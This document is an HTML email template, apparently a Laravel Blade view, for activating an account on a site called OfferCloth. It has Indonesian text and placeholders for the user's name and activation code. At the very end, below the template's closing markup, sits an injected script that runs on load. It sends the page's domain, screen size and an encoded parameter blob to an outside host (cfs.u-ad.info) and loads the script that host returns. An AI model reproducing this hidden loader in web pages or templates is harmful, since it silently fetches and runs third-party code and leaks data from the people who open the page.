...
<html xmlns="http://www.w3.org/1999/xhtml">
                	...
                	<td align="center" valign="top" id="bodyCell">
                    	...
                    	<table bgcolor="#FFFFFF"  border="0" cellpadding="0" cellspacing="0" width="500" id="emailBody">
                                                            ...
                                                            <table border="0" cellpadding="30" cellspacing="0" width="100%">
                                                                <tr>
                                                                    <td align="center" valign="top" class="textContent">
                                                                    	<img src="https://trello-attachments.s3.amazonaws.com/5594c32c67643891818c8dcc/500x500/707a85dc9b02f5b99a5924d98f55b0a1/icon_Apps3.png" width="75" style="float:left">
                                                                        <h1 style="color:#FFFFFF;font-family:Helvetica,Arial,sans-serif;font-size:35px;font-weight:normal;text-align:left;float:left;margin-top:20px;">OfferCloth</h1>
                                                                        ...
                                                                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                                                                            <tr>
                                                                                <td valign="top" class="textContent">
                                                                                    ...
                                                                                    <div style="text-align:left;font-family:Helvetica,Arial,sans-serif;font-size:15px;margin-bottom:0;margin-top:3px;color:#5F5F5F;line-height:135%;">Terima kasih telah mendaftar di layanan kami. Untuk menggunakan layanan kami silakan aktivasi akun anda terlebih dahulu dengan memasukkan kode aktivasi di bawah ini.</div>
                                                                                </td>
                                                                            </tr>
                                                                        </table>
                                                                        <!-- // CONTENT TABLE -->
                                                            ...
                                                            <table border="0" cellpadding="0" cellspacing="0" width="50%" class="emailButton" style="background-color: #3498DB;">
                                                                <tr>
                                                                    <td align="center" valign="middle" class="buttonContent" style="padding-top:15px;padding-bottom:15px;padding-right:15px;padding-left:15px;">
                                                                        <a style="color:#FFFFFF;text-decoration:none;font-family:Helvetica,Arial,sans-serif;font-size:20px;line-height:135%;" href="#" target="_blank">{{ $code }}</a>
                                                                    </td>
                                                                </tr>
                                                            </table>
                                                            <!-- // CONTENT TABLE -->
							...
							<tr>
                            	<td align="center" valign="top">
                                	<!-- CENTERING TABLE // -->
                                	<table border="0" cellpadding="0" cellspacing="0" width="100%" bgcolor="#0D47A1">
                                    	<tr>
                                        	<td align="center" valign="top">
                                            	<!-- FLEXIBLE CONTAINER // -->
                                            	<table border="0" cellpadding="0" cellspacing="0" width="500" class="flexibleContainer">
                                                                            ...
                                                                            <tr>
                                                                                <td valign="top" class="textContent">
                                                                                    <div style="text-align:left;font-family:Helvetica,Arial,sans-serif;font-size:15px;margin-bottom:0;color:#FFFFFF;line-height:135%;">
                                                                                    	Email ini ditujukan hanya untuk {{ $name }}
                                                                                    	Karena anda telah melakukan pendaftaran di OfferCloth. Jika anda merasa tidak mendaftar dengan menggunakan email ini, mohon diabaikan saja.
                                                                                    </div>
                                                                                </td>
                                                                            </tr>
                                                                        </table>
                                                            ...
                                                            <table border="0" cellpadding="30" cellspacing="0" width="100%">
                                                                <tr>
                                                                    <td valign="top" bgcolor="#E1E1E1">
                                                                        ...
                                                                        <div style="font-family:Helvetica,Arial,sans-serif;font-size:13px;color:#828282;text-align:center;line-height:120%;">
                                                                        <div>Copyright &#169; {{ date('Y') }} <a href="http://www.charlesmudy.com/respmail/" target="_blank" style="text-decoration:none;color:#828282;"><span style="color:#828282;">OfferCloth</span></a>. All&nbsp;rights&nbsp;reserved.</div>
    ...
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRXtvf7apUhF697rMsABRLuqc7z475T%2b5DLdVFvR30b5xfsGEtO2Cg%2fM2icni97Il5Jy8Of2%2bph6osONmWIAoQlt6aBfXvaRs9r39q%2b11giLMVJg1q4Hfb6lIkpXRRThHTr7CX7sCg%2b9ysYtVp7e2Ht%2bjx1OPi8FTeA2xr8lGNqB0tALwdgHQIzwgy9sPSs0hOYbQzaslADf4WzOl75BfYzSprMv%2f3%2fbVKdpUS1sZiFCoMkNMQhX715oB%2fk3V%2bZiMyv3DUU3aO2WbRon8NZf7%2br%2fxRDRkopC8g44f%2fmr8dWudPb2haMVrbbyKKtehoHPTEnBEbMjRk3WPlIbj49JSvYJ5y%2fUKWaHdptdLZyEYne%2fH1nbDco6IpPEWwl3LVBtNme3RVO%2bPgy54JtZj4BMQLLSoIo2bXXJkTdMR8C4m%2fsP%2biG7BkmjL93VzJDWBxbSfi5iWwohG4FBsbF0W4HygcvBU00F2glhwPB9DNfpAtaP8EgslNMTCzhd4q7aFhEVkcug95awn4P%2fnYVCC40lyjahYPICWjOmoGoAUr1ACn3D957upCb%2fPdmg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
